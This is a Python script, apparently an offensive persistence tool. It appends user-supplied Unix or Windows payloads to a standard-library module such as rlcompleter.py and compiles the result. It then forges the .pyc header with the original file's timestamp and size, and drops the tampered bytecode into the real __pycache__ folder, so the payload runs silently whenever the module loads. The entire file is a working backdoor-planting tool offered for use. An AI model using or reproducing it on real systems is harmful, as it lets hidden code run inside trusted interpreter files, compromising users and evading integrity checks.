#!/user/bin/env python

import struct
import sys
import os
import fileinput
import shutil
import py_compile


class patch_pyc():
    def __init__(self, org_file, nix_payload=None, windows_payload=None, version=35):
        self.nix_payload = nix_payload
        self.windows_payload = windows_payload
        self.version = version
        self.org_file = org_file
        self.read_payloads()
        self.write_file()

    def read_payloads(self):
        if self.nix_payload:
            self.nix = open(self.nix_payload, 'r').read()
        if self.windows_payload:
                self.windows = open(self.windows_payload, 'r').read()

    def write_file(self):
        #copy to temp
        if os.name == "posix":
            temp_file = "/tmp/" + os.path.basename(self.org_file)
            temp_base = "/tmp/"
            print("PY file temp location:", temp_file)
        if os.name == "nt":
            temp_file = "C:/Windows/Temp/" + os.path.basename(self.org_file)
            temp_base = "C:/Windows/Temp/"
        shutil.copy(self.org_file, temp_file)

        with open(temp_file, 'a') as g:
            if self.nix_payload:
                    g.write(self.nix)
            if self.windows_payload:
                    g.write(self.windows)

        py_compile.compile(temp_file)
        pyc_file = temp_base + "__pycache__/" + os.path.basename(self.org_file).split(".")[0] + ".cpython-" + self.version + ".pyc"
        print("PYC file temp location:", pyc_file)

        timestamp = int(os.stat(self.org_file).st_mtime)
        print("Timestamp of python file:", timestamp)

        # read size... only for python3.5
        with open(os.path.dirname(os.path.abspath(self.org_file)) + "/__pycache__/" + os.path.basename(self.org_file).split(".")[0] + ".cpython-" + self.version + ".pyc", "r+b") as f:
            f.seek(8, 0)
            oldpycsize = struct.unpack("<I", f.read(4))[0]

        print("Old pyc size:", oldpycsize)

        with open(pyc_file, 'r+b') as f:
            f.seek(4, 0)
            f.write(struct.pack("<I", timestamp))
            f.write(struct.pack("<I", oldpycsize))

        shutil.copy(pyc_file, os.path.dirname(os.path.abspath(self.org_file)) + "/__pycache__/")
        os.remove(temp_file)
        os.remove(pyc_file)
        os.rmdir(os.path.dirname(os.path.abspath(pyc_file)))

if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser(description="To replace rlcompleter.pyc with your code... for example")
    parser.add_argument("-p", "--path", help="path to rlcompleter.py")
    parser.add_argument("-l", "--nix", help="payload for nix")
    parser.add_argument("-w", "--windows", help="payload for windows")
    parser.add_argument("-v", "--version", help="python3.X version - 35 for 3.5")
    args = parser.parse_args()

    if not args.path:
        parser.print_help()
        sys.exit()
    if not args.version:
        print("Need python version: '-v 35' for example.")
        parser.print_help()
        sys.exit()
    if not args.nix and not args.windows:
        parser.print_help()
        sys.exit()
    patch_pyc(args.path, args.nix, args.windows, args.version)
    print("Done")
